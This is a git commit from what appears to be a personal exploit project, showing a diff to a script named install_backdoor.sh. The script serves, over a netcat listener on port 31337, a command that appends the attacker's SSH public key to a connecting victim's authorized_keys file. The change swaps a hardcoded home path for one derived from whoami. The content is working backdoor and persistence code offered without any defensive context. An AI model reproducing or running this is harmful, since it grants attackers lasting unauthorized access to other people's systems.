49699e0146828a23d09b92dc7352bac6f8cd1559
Robbe Bryssinck <robbebryssinck@gmail.com>
2020-09-16 10:37:40 -0400

    Added API loop to exploit program

--- install_backdoor.sh
+++ install_backdoor.sh
@@ -2,8 +2,7 @@
 
 sshkey=$( cat ~/.ssh/id_rsa.pub )
 
-# Fix location
-echo "echo \"${sshkey} \" >> /home/robbe/.ssh/authorized_keys; whoami; exit;" | sudo nc -lvp 31337 > out
+echo "/bin/bash; echo \"${sshkey} \" >> /home/\`whoami | cut -d$'\\n' -f1\`/.ssh/authorized_keys; whoami; exit; exit;" | sudo nc -lvp 31337 > out
 
 tr -d '\n' < out > ssh_name
 rm out ssh_name
